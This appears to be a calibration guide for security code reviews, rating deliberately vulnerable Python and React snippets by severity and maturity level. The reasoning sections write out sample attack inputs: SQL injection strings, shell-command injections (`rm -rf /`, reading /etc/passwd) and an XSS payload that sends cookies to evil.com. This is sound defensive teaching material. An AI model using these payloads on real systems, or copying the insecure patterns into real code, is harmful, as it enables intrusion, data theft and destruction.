# Calibration Examples — Security Domain

> Worked examples showing how to judge severity and maturity level for real code patterns. Use these to calibrate prompt output and verify consistency across reviews.

## How to use this document

Each example follows the same four-part structure used across all domain calibration documents:
1. **Code pattern** — what the reviewer sees
2. **Assessment** — severity, maturity level, STRIDE category, confidence
3. **Reasoning** — why this severity and level, not higher or lower
4. **Boundary note** — what would change the assessment up or down

---

## Authentication & Authorization Pillar

### Example AA1: Missing auth check on sensitive endpoint (HIGH / HYG)

**Code pattern:**
```python
@app.route('/admin/users', methods=['DELETE'])
def delete_user():
    user_id = request.args.get('user_id')
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return {"status": "deleted"}, 200
```

**Assessment:** HIGH | HYG | Spoofing + Elevation | HIGH confidence

**Reasoning:** No authentication or authorization check. Any unauthenticated user can delete any other user by guessing or iterating user IDs. This is a destructive operation with no protection. Irreversible — deleted users can't be recovered without a backup restore.

**Boundary — would be MEDIUM / L1 if:**
```python
@app.route('/admin/users', methods=['DELETE'])
@login_required
def delete_user():
    user_id = request.args.get('user_id')
    User.query.filter_by(id=user_id).delete()  # No check if current user is admin
```
Authentication exists but authorization is missing — any logged-in user can delete any user. Still serious, but requires a valid session.

**Boundary — would be LOW / L1 if:**
```python
@app.route('/admin/users', methods=['DELETE'])
@login_required
@admin_required
def delete_user():
    user_id = request.args.get('user_id')
    # No re-authentication for destructive operation
```
Auth and authz exist but missing re-authentication for a sensitive action — a defence-in-depth gap.

### Example AA2: Broken object-level authorization — IDOR (HIGH / L1)

**Code pattern:**
```python
@app.route('/api/documents/<doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.query.get(doc_id)
    return doc.to_dict()
```

**Assessment:** HIGH | L1 | Elevation of Privilege | HIGH confidence

**Reasoning:** Authenticated users can access any document by changing the `doc_id` parameter. No check verifies that the requesting user owns or has access to the document. This is Insecure Direct Object Reference (IDOR) — a consistently top-ranked OWASP vulnerability.

**Boundary — would be HIGH / HYG if:** The document contains health records, financial data, or other regulated information (Regulated test: yes).

**Boundary — would be MEDIUM / L1 if:** The documents are semi-public (e.g., shared project docs where access control is advisory, not mandatory).

### Example AA3: Weak JWT validation (HIGH / HYG)

**Code pattern:**
```python
token = jwt.decode(token_string, options={"verify_signature": False})
user_id = token['sub']
```

**Assessment:** HIGH | HYG | Spoofing | HIGH confidence

**Reasoning:** Signature verification is explicitly disabled. An attacker can forge any JWT with any claims — effectively impersonating any user including admins. Irreversible — any action taken under the forged identity has lasting consequences.

**Boundary — would be MEDIUM / L1 if:**
```python
token = jwt.decode(token_string, SECRET_KEY, algorithms=["HS256"])
# But SECRET_KEY is a weak string like "secret" or "changeme"
```
Signature is verified but the key is guessable. Requires brute-forcing the key.

---

## Data Protection Pillar

### Example DP1: Secrets in source code (HIGH / HYG)

**Code pattern:**
```python
AWS_SECRET_KEY = "AKIAIOSFODNN7EXAMPLE"
DB_PASSWORD = "production_p@ssw0rd!"
```

**Assessment:** HIGH | HYG | Information Disclosure | HIGH confidence

**Reasoning:** Production credentials committed to source code. Anyone with repo access (developers, CI systems, contractors) can see these. Once committed, the secret exists in git history permanently even if removed from HEAD. Irreversible — the credential must be rotated.

**Boundary — would be MEDIUM / L1 if:**
```python
# In a .env.example file
AWS_SECRET_KEY=your-key-here
DB_PASSWORD=your-password-here
```
Template file with placeholder values — not actual secrets, but could mislead developers into putting real secrets in `.env` files that get committed.

### Example DP2: PII in logs (MEDIUM / HYG)

**Code pattern:**
```python
logger.info(f"User registered: {user.email}, phone: {user.phone}, SSN: {user.ssn}")
```

**Assessment:** MEDIUM | HYG | Information Disclosure | HIGH confidence

**Reasoning:** PII (email, phone, SSN) written to log output. Logs are typically stored with less access control than databases, retained for long periods, and shipped to third-party log aggregation services. SSN in logs is a regulatory violation (Regulated test: yes). MEDIUM severity (not HIGH) because this requires log access to exploit — not direct external exploitation.

**Boundary — would be HIGH / HYG if:** The logs are shipped to a third-party service without a data processing agreement, or the application serves EU users (GDPR).

**Boundary — would be LOW / L2 if:**
```python
logger.info(f"User registered: {mask(user.email)}")
```
Email is masked but the log format could benefit from structured fields rather than string interpolation.

### Example DP3: Weak cryptographic algorithm (MEDIUM / L1)

**Code pattern:**
```python
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()
```

**Assessment:** MEDIUM | L1 | Information Disclosure | HIGH confidence

**Reasoning:** MD5 is cryptographically broken for password hashing — rainbow tables exist for common passwords, and GPU cracking is fast. However, exploitation requires first obtaining the hashed passwords (via SQL injection, backup access, etc.), making this a second-order vulnerability. L1 gap — password hashing should use bcrypt, argon2, or scrypt.

**Boundary — would be HIGH / HYG if:** The password hashes are stored in a publicly accessible database or the application has a known SQL injection vulnerability (exploitation path is direct).

**Boundary — would be LOW / L1 if:** MD5 is used for a non-security purpose (file checksums, cache keys) where collision resistance doesn't matter.

---

## Input Validation Pillar

### Example IV1: SQL injection via string concatenation (HIGH / HYG)

**Code pattern:**
```python
@app.route('/users')
def search_users():
    name = request.args.get('name')
    query = f"SELECT * FROM users WHERE name = '{name}'"
    results = db.execute(query)
    return jsonify(results)
```

**Assessment:** HIGH | HYG | Tampering (Injection) | HIGH confidence

**Reasoning:** User input is concatenated directly into a SQL query. An attacker can send `name=' OR 1=1 --` to dump all records, or use `UNION SELECT` to extract data from other tables, or use stacked queries to modify/delete data. Trivially exploitable, no authentication required if the endpoint is public. Irreversible if used for data modification or deletion.

**Boundary — would be MEDIUM / L1 if:**
```python
@app.route('/users')
@login_required
def search_users():
    name = request.args.get('name')
    users = User.query.filter(User.name.like(f"%{name}%")).all()
```
ORM is used (better), but `like()` with direct string interpolation can still be exploited for wildcard injection. Requires authentication.

### Example IV2: Command injection (HIGH / HYG)

**Code pattern:**
```python
@app.route('/convert')
def convert_file():
    filename = request.args.get('filename')
    os.system(f"convert {filename} output.png")
    return send_file("output.png")
```

**Assessment:** HIGH | HYG | Tampering (Injection) | HIGH confidence

**Reasoning:** User input passed directly to a shell command. An attacker sends `filename=; rm -rf /` or `filename=; cat /etc/passwd` for RCE. `os.system()` with string formatting is a textbook command injection. Irreversible — arbitrary commands execute with the application's privileges.

**Boundary — would be MEDIUM / L1 if:**
```python
subprocess.run(["convert", filename, "output.png"])
```
Arguments passed as array (no shell interpretation), but `filename` could still contain path traversal characters.

### Example IV3: XSS via dangerouslySetInnerHTML (HIGH / L1)

**Code pattern:**
```jsx
function Comment({ text }) {
    return <div dangerouslySetInnerHTML={{__html: text}} />;
}
```

**Assessment:** HIGH | L1 | Tampering (Injection) | HIGH confidence

**Reasoning:** User-provided text rendered as raw HTML. An attacker submits `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` as a comment. Every user who views the comment has their session cookie stolen. L1 (not HYG) because impact depends on cookie security (HttpOnly flag), CSP headers, and whether sessions are server-side — but the vulnerability itself is clear and exploitable.

**Boundary — would be HIGH / HYG if:** The application handles financial transactions or health data (Regulated), or if session cookies are not HttpOnly (Irreversible — session hijacking).

**Boundary — would be MEDIUM / L1 if:** The content is only visible to the author (self-XSS) or the application has a strong CSP that blocks inline scripts.

### Example IV4: Unsafe deserialization (HIGH / HYG)

**Code pattern:**
```python
import pickle

@app.route('/upload', methods=['POST'])
def upload():
    data = pickle.loads(request.data)
    process(data)
```

**Assessment:** HIGH | HYG | Tampering (Injection) | HIGH confidence

**Reasoning:** `pickle.loads()` on untrusted input is arbitrary code execution by design — pickle can instantiate any Python object, including `os.system("rm -rf /")`. No safe mode exists for pickle. Irreversible — the attacker achieves RCE.

**Boundary — would be MEDIUM / L1 if:**
```python
data = yaml.load(request.data)  # Missing Loader argument
```
YAML without `safe_load()` can execute arbitrary Python, but requires specific YAML tags — slightly harder to exploit than pickle. Still dangerous.

---

## Audit & Resilience Pillar

### Example AR1: No audit log on destructive operation (MEDIUM / L2)

**Code pattern:**
```python
@app.route('/api/users/<user_id>', methods=['DELETE'])
@login_required
@admin_required
def delete_user(user_id):
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return {"status": "deleted"}, 200
```

**Assessment:** MEDIUM | L2 | Repudiation | HIGH confidence

**Reasoning:** A destructive admin operation with no audit trail. No record of who deleted the user, when, or why. If a rogue admin deletes users, there's no evidence. This is an L2 gap (security-relevant actions should produce audit records). MEDIUM because the endpoint has proper auth/authz — the attack requires a compromised admin account.

**Boundary — would be HIGH / HYG if:** The operation deletes regulated data (health records, financial records) where audit trails are legally required (Regulated test: yes).

### Example AR2: No rate limiting on login (MEDIUM / L1)

**Code pattern:**
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    user = User.query.filter_by(username=username).first()
    if user and check_password_hash(user.password_hash, password):
        session['user_id'] = user.id
        return redirect('/dashboard')
    return render_template('login.html', error='Invalid credentials')
```

**Assessment:** MEDIUM | L1 | Spoofing + Denial of Service | HIGH confidence

**Reasoning:** No rate limiting on the login endpoint. An attacker can attempt unlimited password guesses (brute force) to compromise accounts. Also a DoS vector — flooding the login endpoint with requests consumes database query capacity. L1 gap because rate limiting on authentication is a foundational security control.

**Boundary — would be HIGH / HYG if:** The application has no account lockout AND password complexity requirements are weak (Irreversible — compromised accounts can take destructive actions).

**Boundary — would be LOW / L2 if:** Rate limiting exists at the infrastructure level (WAF, API gateway) but isn't visible in the application code — the reviewer should note the caveat.

### Example AR3: Unbounded query on public endpoint (HIGH / HYG)

**Code pattern:**
```python
@app.route('/api/search')
def search():
    term = request.args.get('q')
    results = Product.query.filter(Product.name.like(f"%{term}%")).all()
    return jsonify([r.to_dict() for r in results])
```

**Assessment:** HIGH | HYG | Denial of Service | HIGH confidence

**Reasoning:** No pagination, no result limit, no authentication. An attacker searches for `%` (matches everything) and the query returns the entire products table. If the table has millions of rows, this exhausts database connections and application memory. Repeated requests can bring down the service. Total test: yes — can render the service unresponsive.

**Boundary — would be MEDIUM / L2 if:** The endpoint requires authentication and the query has a `LIMIT 100` but no pagination (bounded but incomplete).

### Example AR4: ReDoS vulnerability (MEDIUM / L2)

**Code pattern:**
```python
import re

@app.route('/validate')
def validate_email():
    email = request.args.get('email')
    pattern = re.compile(r'^([a-zA-Z0-9]+)*@[a-zA-Z0-9]+\.[a-zA-Z]+$')
    if pattern.match(email):
        return {"valid": True}
```

**Assessment:** MEDIUM | L2 | Denial of Service | MEDIUM confidence

**Reasoning:** The regex `([a-zA-Z0-9]+)*` contains a nested quantifier that causes exponential backtracking on inputs like `aaaaaaaaaaaaaaaaaaaaaa!`. An attacker can send a crafted string that takes minutes to evaluate, blocking the worker thread. MEDIUM confidence because the actual impact depends on the regex engine and the input length threshold.

**Boundary — would be HIGH / HYG if:** The endpoint is public, unauthenticated, and the regex is evaluated in the main request-handling thread with no timeout (Total test).

---

## Cross-pillar: How the same issue gets different assessments

### Hardcoded API key — assessed by different pillars

The same `API_KEY = "sk-1234567890abcdef"` in source code might be flagged by:

| Pillar | STRIDE | Emphasis |
|--------|--------|----------|
| **authn-authz** | Spoofing | "Anyone with repo access can use this key to authenticate as the service" |
| **data-protection** | Information Disclosure | "Secret exposed in source code, accessible to all repo readers, persists in git history" |

**During synthesis:** These merge into one finding. The data-protection assessment typically takes precedence (the key is exposed regardless of whether it's used for auth). The recommendation combines: "Move the key to environment variables or a secret manager (data-protection), and scope the key's permissions to minimum required (authn-authz)."

### Missing rate limiting on auth endpoint — assessed by different pillars

The same unprotected `/login` endpoint might be flagged by:

| Pillar | STRIDE | Emphasis |
|--------|--------|----------|
| **authn-authz** | Spoofing | "Unlimited password attempts enable brute-force account compromise" |
| **audit-resilience** | Denial of Service | "Unlimited requests to the login endpoint can exhaust database connection pool" |

**During synthesis:** These merge into one finding with both STRIDE categories noted. The recommendation addresses both: "Add rate limiting per-IP and per-user (prevents brute force and resource exhaustion), implement account lockout after N failures (prevents account compromise), log failed attempts for detection (audit trail)."
